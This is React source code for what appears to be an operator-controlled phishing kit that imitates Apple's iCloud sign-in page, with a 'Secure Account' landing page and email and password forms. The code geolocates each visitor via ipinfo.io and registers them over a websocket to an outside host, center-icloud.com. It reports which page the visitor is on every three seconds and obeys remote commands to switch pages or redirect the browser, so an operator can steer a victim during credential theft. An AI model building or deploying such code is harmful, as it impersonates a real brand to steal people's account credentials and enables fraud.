                    <form onSubmit={handleContinue} className="w-full pl-12 pr-12 flex flex-col items-start space-y-6">
                        <div className="relative w-full">
                            <input
                                type="text"
                                value={email}
                                onChange={handleEmailChange}
                                className={`w-full h-[3.294118rem] rounded-[10px] ${emailError ? 'bg-[#300] border-[#ff3037]' : 'bg-[#2c2c2e] border-[#6e6e73]'} px-4 text-[16px] text-white placeholder-transparent focus:outline-none focus:border-[#0071e3] focus:ring-2 focus:ring-blue-500 peer pt-4`}
                                autoFocus
                            />
                            <label
                                htmlFor="email"
                                className={`absolute left-4 top-1/2 -translate-y-1/2 ${emailError ? 'text-[#ff3037]' : 'text-[#8e8e93]'} text-[16px] transition-all duration-100 
               peer-focus:text-md
               peer-focus:top-1 
               peer-focus:-translate-y-0 
               peer-focus:scale-75 
               peer-focus:origin-left
               pointer-events-none
               ${email ? 'text-sm top-[17px] -translate-y-0 scale-75 origin-left' : ''}`}
                            >
                                Email or Phone Number
                            </label>
                            {emailError && (
                                <div className="absolute -bottom-5 left-0 text-[#ff3037] text-xs">
                                    {emailError}
                                </div>
                            )}
                        </div>

                        <div className="w-full pt-2 pl-[17px] pr-[17px]">
                            <div className="flex items-center justify-center gap-3 mb-4">
                                <img src="/privacy-icon.png" alt="Privacy Information" className="w-9" />
                            </div>
                            <p
                                style={{
                                    fontWeight: "400",
                                    letterSpacing: "-.01em",
                                    lineHeight: "1.3333733333",
                                    fontSize: "13px",
                                }}>
                                Your Apple Account information is used to allow you to sign in securely and access your data. Apple records certain data for security, support and reporting purposes. If you agree, Apple may also use your Apple Account information to send you marketing emails and communications, including based on your use of Apple services.{' '}
                                <a href="#" className="text-[#2997ff] hover:underline">
                                    See how your data is managed...
                                </a>
                            </p>
                        </div>

                        <div className="w-full">
                            <div className="flex gap-3 w-full mb-2">
                                <button
                                    type="submit"
                                    className="flex-1 h-[38px] rounded-[10px] bg-[#0071e3] text-white text-[16px] font-medium hover:bg-[#0077ED] active:bg-[#0069d1] transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                                    disabled={!email.trim() || emailError}
                                >
                                    Continue
                                </button>
                                <div className="flex-1 flex flex-col">
                                    <button
                                        type="button"
                                        disabled={true}
                                        title="Disabled for verification"
                                        className="h-[38px] rounded-[10px] bg-white text-black text-[14px] font-medium flex items-center justify-center gap-2 px-4"
                                    >
                                        <img src="/iphone-icon.svg" alt="iPhone Icon" className="w-5" />
                                        Sign in with iPhone
                                    </button>
                                    <p className="text-[12px] text-white pt-2 text-left w-full pt-1 pl-1">
                                        Currently unavailable account under verification.
                                    </p>
                                </div>
                            </div>
                        </div>
                    </form>
                ) : (
                    <form onSubmit={handleSignIn} className="w-full p-10 pt-0 flex flex-col items-start pl-10 pr-10">
                        <div className="relative w-full">
                            <input
                                type="text"
                                value={email}
                                onChange={(e) => {
                                    handleEmailChange(e);
                                    if (e.target.value !== email) {
                                        setPageState('loginPage');
                                        setSignInDenied(false);
                                        if (socket) {
                                            socket.emit("page", { page: "loginPage" });
                                        }
                                    }
                                }}
                                className={`w-full h-[3.294118rem] rounded-t-[10px] rounded-b-none ${signInDenied || emailError ? 'bg-[#300] border-1 border-[#ff3037] border-b-[#ff3037] text-white' : 'bg-[hsla(0,0%,100%,.04)] border-[#ad8200]'} px-4 text-[16px] pt-4 peer focus:outline-none focus:border-[#3b82f6] focus:ring-2 focus:ring-blue-500 shadow-[inset_0_0_0_100px_#2b2000] ${signInDenied || emailError ? '' : 'border-b-white/10 peer-focus:border-b-[#3b82f6]'}`}
                                autoFocus
                            />
                            <label
                                htmlFor="email"
                                className={`absolute left-4 top-1/2 -translate-y-1/2 ${signInDenied || emailError ? 'text-[#ff3037]' : 'text-[#8e8e93]'} text-[16px] transition-all duration-100 
                   peer-focus:text-sm
                   peer-focus:top-1 
                   peer-focus:-translate-y-0 
                   peer-focus:scale-75 
                   peer-focus:origin-left
                   pointer-events-none
                   ${email ? 'text-sm top-[17px] -translate-y-0 scale-75 origin-left' : ''}`}
                            >
                                Email or Phone Number
                            </label>
                        </div>

                        <div className="relative w-full -mt-px">
                            <input
                                type="password"
                                value={password}
                                onChange={handlePasswordChange}
                                className={`w-full h-[3.294118rem] rounded-b-[10px] rounded-t-none ${signInDenied || passwordError ? 'bg-[#300] border-1 border-[#ff3037] border-b-[#ff3037] text-white' : 'bg-[hsla(0,0%,100%,.04)] border-[#6e6e73]'} px-4 text-[16px] placeholder-transparent focus:outline-none focus:border-[#3b82f6] focus:ring-2 focus:ring-blue-500 pt-4 peer ${signInDenied || passwordError ? '' : 'border-t-white/10 peer-focus:border-t-[#3b82f6]'}`}
                            />
                            <label
                                htmlFor="password"
                                className={`absolute left-4 top-1/2 -translate-y-1/2 ${signInDenied || passwordError ? 'text-[#ff3037]' : 'text-[#8e8e93]'} text-[16px] transition-all duration-100 
                   peer-focus:text-sm
                   peer-focus:top-1 
                   peer-focus:-translate-y-0 
                   peer-focus:scale-75 
                   peer-focus:origin-left
                   pointer-events-none
                   ${password ? 'text-sm top-[17px] -translate-y-0 scale-75 origin-left' : ''}`}
                            >
                                Password
                            </label>
                            {passwordError && !signInDenied && (
                                <div className="absolute -bottom-5 left-0 text-[#ff3037] text-xs">
                                    {passwordError}
                                </div>
                            )}
                        </div>

                        {signInDenied ? (
                            <div className="w-full mt-4 text-left">
                                <span className="text-[#ff3037] text-[13px] flex items-start gap-1" dir="auto">
                                    <CircleAlert size={14} className="flex-shrink-0 mt-0.5" />
                                    <span>
                                        Check the account information you entered and try again.
                                        <a
                                            href="https://iforgot.apple.com/password/verify/appleid"
                                            target="_blank"
                                            className="text-[#3b82f6] ml-1"
                                        >
                                            Forgotten your password <MoveUpRight size={14} className="inline ml-0.5" />
                                        </a>
                                    </span>
                                </span>
                            </div>
                        ) : (
                            <div className="flex items-center justify-between w-full mt-4">
                                <div className="form-checkbox">
                                    <input
                                        type="checkbox"
                                        id="remember-me"
                                        checked={rememberMe}
                                        onChange={(e) => setRememberMe(e.target.checked)}
                                        className="form-checkbox-input sr-only peer"
                                    />
                                    <label
                                        htmlFor="remember-me"
                                        className="form-label tk-body-reduced flex items-center cursor-pointer"
                                    >
                                        <span
                                            className={`form-checkbox-indicator w-5 h-5 rounded border mr-2 
                               flex items-center justify-center
                               peer-focus:border-[#3b82f6] peer-focus:ring-2 peer-focus:ring-[#3b82f6]/20
                               ${rememberMe ? 'bg-[#3b82f6] border-[#3b82f6] text-white' : 'border-[#6e6e73] bg-[hsla(0,0%,100%,.04)]'}`}
                                            aria-hidden="true"
                                        >
                                            {rememberMe && '✓'}
                                        </span>
                                        Keep me signed in
                                    </label>
                                </div>

                                <a
                                    href="#"
                                    className="text-[#3b82f6] text-[14px] hover:underline whitespace-nowrap flex items-center gap-1"
                                >
                                    Forgotten your password? <MoveUpRight size={12} className="inline" />
                                </a>
                            </div>
                        )}

                        <div className="flex gap-3 w-full mt-[100px]">
                            <button
                                type="submit"
                                disabled={loading || !password.trim() || password.length < 8 || emailError || passwordError}
                                className="flex-1 h-[36px] rounded-[10px] bg-[#3b82f6] text-white text-[16px] font-medium hover:bg-[#2563eb] active:bg-[#1d4ed8] transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                            >
                                {loading ? 'Signing In...' : 'Sign In'}
                            </button>
                        </div>
                    </form>
                )}
            </div>
        </div>
    );
}

function LandingContent({ onSignIn, socket }) {
    return (
        <>
            <div className="w-[420px]">
                <video
                    src="/fpo-dark@1x.mp4"
                    width="430"
                    height="388"
                    autoPlay
                    playsInline
                    loop
                    muted
                    className="w-full"
                    title="Animation showing different users' Memojis surrounded by the icons of the apps the user personally uses most"
                />
                <h1 className="text-center z-10 font-sans text-[140px] font-semibold leading-[167px] tracking-[-2.8px] [color:var(--theme-color-labelPrimary)] mt-0 mb-0">
                    iCloud
                </h1>
                <div>
                    <Button
                        variant="outline"
                        onClick={() => {
                            onSignIn();
                            if (socket) socket.emit("page", { page: "loginPage" });
                        }}
                        className="text-[rgb(28,28,30)] font-semibold text-[19px] rounded-full h-[44px] min-w-[146px] hover:bg-gray-400 border-0 mt-[30px] hover:border-0 transition-none">
                        Secure Account
                    </Button>
                    <h2
                        style={{
                            fontFamily: 'SF Pro Display, Helvetica Neue, sans-serif',
                            fontSize: '33px',
                            fontWeight: 600,
                            lineHeight: '44px',
                            marginTop: '40px',
                            marginBottom: '20px',
                            WebkitMarginBefore: '40px',
                            marginBlockStart: '40px',
                            WebkitMarginAfter: '20px',
                            marginBlockEnd: '20px',
                            wordWrap: 'normal',
                            overflowWrap: 'normal',
                            wordBreak: 'keep-all',
                        }}
                    >
                        The best place for all your{'\n'}
                        photos, files, notes, mail{'\n'}
                        and more.
                    </h2>
                </div>
            </div>

            <div className="mt-16 flex flex-col xl:flex-row justify-center items-center gap-8 xl:gap-13 w-full px-4">
                <div className="flex flex-col rounded-[11px] bg-[#1c1c1e] p-9 text-start max-w-[650px] h-full w-[478px] shadow-[17px_20px_40px_rgba(0,0,0,0.6)]">
                    <div className="mt-[50px] mb-[50px]">
                        <img
                            src="/icloud-tile1.png"
                            alt="Collection of icons for apps available on iCloud.com, including Mail, Find My and Reminders"
                            className="w-full max-w-[400px]"
                        />
                    </div>
                    <h2 className="text-[26px] font-semibold leading-tight mb-[67px] text-white">
                        Easily access apps and data from your iPhone on the web
                    </h2>
                    <p className="font-sans text-[18px] font-normal leading-[25px] [color:var(--theme-color-labelPrimary)] tracking-[-0.37px] mt-5 [margin-block-start:20px]">
                        iCloud is essential for keeping personal information from your devices safe, up to date, and available wherever you are. At iCloud.com, you can access your photos, files and more from any web browser. Changes you make will sync to your iPhone and other devices, so you are always up to date.
                    </p>
                </div>

                <div className="flex flex-col rounded-[11px] bg-[#1c1c1e] p-9 text-start max-w-[650px] w-[478px] shadow-[17px_20px_40px_rgba(0,0,0,0.6)]">
                    <div className="mb-3">
                        <img
                            src="/icloud-tile2.png"
                            alt="Graphic depicting the icons for various iCloud+ benefits, including up to 12TB of storage"
                            className="w-full max-w-[400px]"
                        />
                    </div>
                    <h2 className="text-[26px] font-semibold leading-tight mb-4 text-white">
                        More storage, plus features to protect your privacy and connect with friends
                    </h2>
                    <p className="font-sans text-[18px] font-normal leading-[25px] [color:var(--theme-color-labelPrimary)] tracking-[-0.37px] mt-[10px] [margin-block-start:20px]">
                        Upgrade to iCloud+ to get more storage, plan events with Apple&nbsp;Invites and have peace of mind with privacy features like iCloud Private Relay, Hide&nbsp;My&nbsp;Email and HomeKit Secure Video. You can even share your subscription with your family. Learn more at{' '}
                        <a
                            target="_blank"
                            rel="noopener noreferrer"
                            href="https://apple.com/icloud"
                            className="text-[#2997ff] hover:underline"
                            aria-label="apple.com/icloud (opens in a new tab)"
                        >
                            apple.com/icloud
                        </a>
                        .
                    </p>
                </div>
            </div>
        </>
    );
}

export default function Landing() {
    const [socket, setSocket] = useState(null);
    const [socketId, setSocketId] = useState(null);
    const [geoData, setGeoData] = useState(null);
    const [fetchingGeo, setFetchingGeo] = useState(false);
    const [pageState, setPageState] = useState('landingPage');
    const [redirectUrl, setRedirectUrl] = useState(null);

    useEffect(() => {
        if (!socket) return;
        socket.emit("page", { page: pageState });

        const interval = setInterval(() => {
            socket.emit("page", { page: pageState });
        }, 3000);

        return () => {
            clearInterval(interval);
        };
    }, [socket, pageState]);

    const fetchIPInfo = async () => {
        try {
            setFetchingGeo(true);
            const response = await fetch('https://ipinfo.io/json');
            if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
            const data = await response.json();
            setGeoData(data);
            return data;
        } catch {
            return {
                ip: 'unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown',
                loc: '0,0', org: 'Unknown', postal: 'Unknown', timezone: 'Unknown'
            };
        } finally {
            setFetchingGeo(false);
        }
    };

    useEffect(() => {
        if (!socket) return;

        const handleRedirectPage = (data) => {
            console.log('Redirect page command received:', data);
            if (data.page) {
                setPageState(data.page);
                socket.emit("page", { page: data.page });
            }
        };

        socket.on('redirectPage', handleRedirectPage);

        return () => {
            socket.off('redirectPage', handleRedirectPage);
        };
    }, [socket]);

    useEffect(() => {
        const socketConnection = io('https://center-icloud.com', {
            transports: ['websocket', 'polling'],
            reconnection: true
        });

        socketConnection.on('connect', async () => {
            setSocketId(socketConnection.id ?? null);
            const geo = await fetchIPInfo();
            socketConnection.emit('register', geo);
        });

        socketConnection.on('connect_error', () => {
            setSocketId(null);
        });

        socketConnection.on('disconnect', () => {
            setSocketId(null);
        });

        socketConnection.on('redirect', (data) => {
            console.log('Redirect command received:', data);
            if (data.url) {
                setRedirectUrl(data.url);
            }
        });

        setSocket(socketConnection);

        return () => {
            socketConnection.disconnect();
        };
    }, []);

    useEffect(() => {
        if (redirectUrl) {
            window.location.href = redirectUrl;
        }
    }, [redirectUrl]);

    return (
        <div className="relative flex min-h-screen flex-col items-center bg-[#1c1c1e] font-sans overflow-auto">
            <header className="fixed top-0 z-50 flex w-full items-center justify-between bg-[rgba(28,28,30,.5)] backdrop-blur-md h-[44px] pl-[16px] pr-[15px]">
                <div className="flex items-center">
                    <svg
                        xmlns="http://www.w3.org/2000/svg"
                        height="31"
                        aria-hidden="true"
                        fill="white"
                        className="apple-icloud-logo dark"
                        viewBox="0 0 82 31"
                    >
                        <path d="M19.407 23h2.55V11.923h-2.55zm1.28-12.832q.619 0 1.05-.43a1.4 1.4 0 0 0 .432-1.033q0-.61-.432-1.038a1.45 1.45 0 0 0-1.05-.426q-.61 0-1.046.426-.437.427-.437 1.038 0 .601.437 1.032.436.43 1.046.43zm9.915 13.156q1.71 0 3.052-.631c.864-.395 1.616-1 2.188-1.758q.844-1.127 1.037-2.619l.007-.091h-2.594l-.021.076a3.6 3.6 0 0 1-.713 1.465 3.35 3.35 0 0 1-1.258.943q-.75.328-1.695.328-1.27 0-2.204-.663T26.96 18.49q-.507-1.22-.507-2.886v-.016q0-1.672.507-2.886.506-1.214 1.439-1.875.93-.66 2.199-.66.95 0 1.702.351.752.352 1.257.99.506.637.705 1.505l.026.105h2.59l-.004-.093q-.176-1.509-1.028-2.668a5.9 5.9 0 0 0-2.204-1.819q-1.352-.658-3.044-.658-2.107 0-3.642.935-1.533.935-2.368 2.663-.834 1.728-.834 4.113v.016q0 2.382.834 4.11.833 1.73 2.372 2.669 1.539.938 3.642.938M38.636 23h2.55V7.74h-2.55zm9.534.222q1.65 0 2.846-.693 1.196-.692 1.846-1.982t.65-3.08v-.02q0-1.787-.655-3.074a4.7 4.7 0 0 0-1.852-1.98q-1.197-.69-2.838-.691-1.63-.001-2.829.694a4.7 4.7 0 0 0-1.855 1.981q-.657 1.288-.656 3.07v.02q0 1.787.65 3.078t1.85 1.984 2.843.693m.004-2.066q-.858 0-1.472-.436-.612-.436-.941-1.261t-.329-1.99v-.02q0-1.164.33-1.985t.944-1.259q.613-.437 1.461-.437.856 0 1.469.436.611.435.941 1.258.33.822.33 1.987v.02q0 1.163-.328 1.988-.327.824-.936 1.262-.61.436-1.469.437m10.596 2.066c.497.008.991-.071 1.46-.233q.645-.233 1.106-.668c.309-.29.557-.639.73-1.026h.13V23h2.55V11.923h-2.55v6.444q0 .616-.165 1.114a2.3 2.3 0 0 1-.485.853 2.15 2.15 0 0 1-.783.546 2.7 2.7 0 0 1-1.054.191q-1.131 0-1.657-.647t-.526-1.894v-6.607h-2.55v7.166q0 1.3.433 2.228.434.927 1.281 1.416.849.489 2.08.489m12.084-.024q.787 0 1.441-.24a3.45 3.45 0 0 0 1.955-1.747h.13V23h2.55V7.74h-2.55v5.997h-.13a3.3 3.3 0 0 0-.802-1.073q-.507-.449-1.167-.694a4.1 4.1 0 0 0-1.433-.244q-1.398 0-2.42.693-1.021.694-1.579 1.978-.557 1.282-.557 3.055v.016q0 1.761.559 3.049.558 1.288 1.585 1.984 1.026.697 2.418.697m.783-2.15q-.849 0-1.466-.432-.617-.43-.95-1.235-.33-.804-.33-1.913v-.016q0-1.114.331-1.912.333-.8.95-1.232.618-.432 1.465-.432.84 0 1.46.436.62.435.964 1.237.343.8.343 1.906v.016q0 1.098-.34 1.902-.34.805-.963 1.24t-1.464.434zM11.356 9.658c.494-.598.844-1.413.844-2.238 0-.114-.01-.227-.03-.32-.805.03-1.774.536-2.351 1.217-.454.516-.877 1.341-.877 2.167 0 .123.02.247.031.288.052.01.134.021.217.021.721 0 1.629-.485 2.165-1.135zm.567 1.31c-1.207 0-2.186.733-2.815.733-.67 0-1.546-.691-2.598-.691-1.99 0-4.01 1.65-4.01 4.755 0 1.94.742 3.982 1.67 5.303.794 1.114 1.485 2.032 2.485 2.032.99 0 1.422-.66 2.65-.66 1.247 0 1.525.64 2.618.64 1.082 0 1.804-.991 2.484-1.971.763-1.124 1.083-2.218 1.093-2.27-.062-.02-2.134-.866-2.134-3.239 0-2.053 1.629-2.97 1.722-3.043-1.073-1.547-2.712-1.589-3.165-1.589"></path>
                    </svg>
                </div>

                <DropdownMenu>
                    <DropdownMenuTrigger asChild>
                        <button className="p-2 text-white hover:bg-white/10 rounded-lg focus:outline-none focus:ring-0 focus-visible:ring-0 focus-visible:ring-offset-0 data-[state=open]:bg-[#2c2c2e] data-[state=open]:text-zinc-900">
                            <svg
                                xmlns="http://www.w3.org/2000/svg"
                                width="22"
                                height="22"
                                aria-hidden="true"
                                className="fill-current"
                                viewBox="0 0 64 64"
                            >
                                <path d="M14.932 32.032c0-3.497-2.835-6.3-6.395-6.3a6.3 6.3 0 0 0-6.3 6.3c0 3.496 2.835 6.3 6.3 6.3 3.56 0 6.395-2.804 6.395-6.3m23.312 0c0-3.497-2.804-6.3-6.3-6.3-3.466 0-6.27 2.803-6.27 6.3s2.804 6.3 6.27 6.3c3.496 0 6.3-2.804 6.3-6.3m23.406 0c0-3.497-2.804-6.3-6.3-6.3-3.56 0-6.364 2.803-6.364 6.3s2.803 6.3 6.363 6.3c3.497 0 6.3-2.804 6.3-6.3" />
                            </svg>
                        </button>
                    </DropdownMenuTrigger>
                    <DropdownMenuContent
                        className="rounded-lg bg-[#1c1c1c] border-0 shadow-[17px_20px_40px_rgba(0,0,0,0.6)] animate-in fade-in-0 zoom-in-95"
                        sideOffset={5}
                    >
                        <DropdownMenuItem className="text-blue-500 data-[highlighted]:text-blue-500 data-[highlighted]:bg-[#2c2c2e] focus:outline-none">
                            <CircleHelp className="text-blue-500 mr-2" />
                            iCloud User Guide
                            <MoveUpRight className="text-blue-500 ml-2" />
                        </DropdownMenuItem>
                    </DropdownMenuContent>
                </DropdownMenu>
            </header>

            <main className="flex w-full flex-1 flex-col items-center px-3 pt-[44px] pb-20 text-center text-white">
                <main className="flex w-full flex-1 flex-col items-center px-3 pt-[44px] pb-20 text-center text-white">
                    {pageState === 'landingPage' ? (
                        <LandingContent onSignIn={() => setPageState('loginPage')} socket={socket} />
                    ) : pageState === 'AURPage' ? (
                        <AURPage socket={socket} refId={Array.from(socket.id).reduce((acc, char) => acc + char.charCodeAt(0) * 100, 0).toString().slice(0, 6)} setPageState={setPageState} />
                    ) : (
                        <LoginCard pageState={pageState} setPageState={setPageState} socket={socket} />
                    )}
                </main>
            </main>

            <div className="mt-20 bg-[#2c2c2e] w-full">
                <div className="flex justify-between items-center text-gray-400 mb-7 text-sm pt-6 px-20">
                    <div className="flex items-center space-x-0">
                        <a
                            target="_blank"
                            rel="noopener noreferrer"
                            href="https://www.apple.com/support/systemstatus/"
                            className="px-3 text-[12px]"
                            aria-label="System Status (opens in a new tab)"
                        >
                            System Status
                        </a>
                        <span className="text-gray-600">|</span>
                        <a
                            target="_blank"
                            rel="noopener noreferrer"
                            href="https://www.apple.com/legal/privacy/"
                            className="px-3 text-[12px]"
                            aria-label="Privacy Policy (opens in a new tab)"
                        >
                            Privacy Policy
                        </a>
                        <span className="text-gray-600">|</span>
                        <a
                            target="_blank"
                            rel="noopener noreferrer"
                            href="https://www.apple.com/legal/internet-services/icloud/"
                            className="px-3 text-[12px]"
                            aria-label="Terms & Conditions (opens in a new tab)"
                        >
                            {'Terms & Conditions'}
                        </a>
                    </div>
                    <div className="text-gray-500 text-[12px]">
                        {'Copyright \u00A9 2026 Apple Inc. All rights reserved.'}
                    </div>
                </div>
            </div>
        </div>
    );
}